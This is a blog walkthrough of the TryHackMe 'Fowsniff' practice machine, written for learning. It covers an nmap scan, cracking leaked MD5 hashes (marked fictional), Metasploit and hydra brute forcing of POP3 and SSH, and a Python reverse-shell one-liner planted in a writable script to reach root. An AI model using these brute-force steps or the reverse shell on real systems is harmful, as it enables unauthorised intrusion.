---
title: "THM: Fowsniff"
date: 2025-02-16
# weight: 1
# aliases: ["/first"]
tags: ["THM", "Tryhackme", "Fowsniff"]
author: "YUN Mony"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Fowsniff is a machine on Tryhackme website"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: false # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "cover/fowsniff.jpg" # image path/url
    alt: "THM : Fowsniff" # alt text
    # caption: "Fluffy Machine from HackTheBox" # display caption under cover
    relative: true # when using page bundles set this to true
    hidden: false # set to false to show the cover image
    # linkFullImages: true
---

This boot2root machine if brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research(its amazing how much information Google can find you), decoding hashes, brute forcing a pop3 login and much more!

# The Question Answer នៅខាងក្រោម:

## 1. Using nmap, scan this machine. What ports are open?

### របៀបធ្វើ

Use nmap to scan to discover open ports.

```bash
nmap -sV -sC -T4 -oN fowsniff.txt 10.10.229.221
```

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20140315.png)
This is the result of the scan, we discovered 4 ports open, such as; ssh, http, pop3, imap.

## 2. Using the information of the open ports, Look around. What you can find?

### របៀបធ្វើ

First of all, i would explore the http (website), by typing the IP address into the browser to see if we can find any useful information. Yeah we did!
![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20143957.png)
We found that Fowsniff Corp. suffered from a data breach that resulted in the exposure of employee usernames and passwords. and we saw twitter of Fowsniff Corp. now let's explore their twitter.

## 3. Using Google, can you find any public information about them?

### របៀបធ្វើ

Using google, to search for Fowsniff Corp. data breach and we found this twitter.
![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20144423.png)

We have found a link to pastebin website, where the leaked credential of employees are stored.

```
FOWSNIFF CORP PASSWORD LEAK
            ''~``
           ( o o )
+-----.oooO--(_)--Oooo.------+
|                            |
|          FOWSNIFF          |
|            got             |
|           PWN3D!!!         |
|                            |
|       .oooO                |
|        (   )   Oooo.       |
+---------\ (----(   )-------+
           \_)    ) /
                 (_/
FowSniff Corp got pwn3d by B1gN1nj4!
No one is safe from my 1337 skillz!


mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e

Fowsniff Corporation Passwords LEAKED!
FOWSNIFF CORP PASSWORD DUMP!

Here are their email passwords dumped from their databases.
They left their pop3 server WIDE OPEN, too!

MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P

l8r n00bz!

B1gN1nj4

-------------------------------------------------------------------------------------------------
This list is entirely fictional and is part of a Capture the Flag educational challenge.

All information contained within is invented solely for this purpose and does not correspond
to any real persons or organizations.

Any similarities to actual people or entities is purely coincidental and occurred accidentally.
```

Here are the information there! now we need to copy only credentials and paste into our kali machine. now it comes to text manipulation technique in order to extract information we need only.
` cat credentials.txt | cut -d: -f2 > hashes.txt` this command will extract only hashes password and put it into hashes.txt.

## 4. Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.

### របៀបធ្វើ

Now can display the hashes.txt and copy those hashes and put into crackstation.net, here i used crackstation to crack the hashes.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20144628.png)

After we cracked the passwords, we successfully cracked many passwords, now try to copy the password and put into a text file inside our kali machine and name it as `password.txt`.

Now we used text manipulation to extract the username of the employees, by using the following command:
`cat credentials.txt | cut -d@ -f1 > accounts.txt`

This will extract only usernames from our credential.txt file which contain multiple data. now we got accounts.txt which store usernames, and passwords.txt which store passwords.

## 5. Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?

### របៀបធ្វើ

Use metasploit to brute force the pop3 login with the usernames, and cracked passwords.

```
msfconsole
use auxiliary/scanner/pop3/pop3-login
set RHOST 10.10.229.221
set STOP_ON_SUCESS true
set USER_FILE accounts.txt
set PASS_FILE passwords.txt
exploit
```

## 6. What was seina's password to the email service?

### របៀបធ្វើ

Use metasploit. seina's password is scoobydoo2. you can see the image below.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20144705.png)

## 7. Can you connect to the pop3 service with her credentials? What email information can you gather?

### របៀបធ្វើ

Now we can use that credential attempt to log into pop3 using Netcat.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20145118.png)

We have found 2 messages inside POP3.

## 8. Looking through her emails, what was a temporary password set for her?

### របៀបធ្វើ

Using command to read the messages, now let's read the first message first.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20145152.png)

We found an exited message! we found some temporary ssh password, we can use it to brute force ssh with the usernames we had. Now copy that password and put it into a text file, name whatever you want.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20145434.png)

I used hydra to brute force ssh service with the usernames and ssh password we have found, now we are able to find a credential for ssh login. Now let's ssh to that machine.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20145526.png)

## 9. Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?

### របៀបធ្វើ

When logged in, we need to find the groups this user belong to by using the following command:
`groups` and then we try to find the files that can run by that group.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20150058.png)

We have found interesting file named `cube.sh`. now let's go and open that files with any text editor.

10. Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

```
Python Reverse Shell:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

They have provided us with a python reverse shell, we can use that and put inside cube.sh file modify the IP address and port part inside that payload and save it.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20151313.png)

Now we have to set up a listener on our local machine.
![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20151251.png)

After setup the listener, now execute the cube.sh on the remote machine that we ssh to, Now get back to our local machine bomb, now we have escalated our privilege from baksteen to root.

![Alt text](https://bafybeidx2odzw3gcikveb7nbqrulz6lsajw62sgecycum6ebgoxtsxpqou.ipfs.w3s.link/Screenshot%202025-01-17%20151228.png)

Type id to see our current id, we can now we are root now go to /root directory and cat the flag.txt, to get our Congratulations!

Thanks for reading my blog!
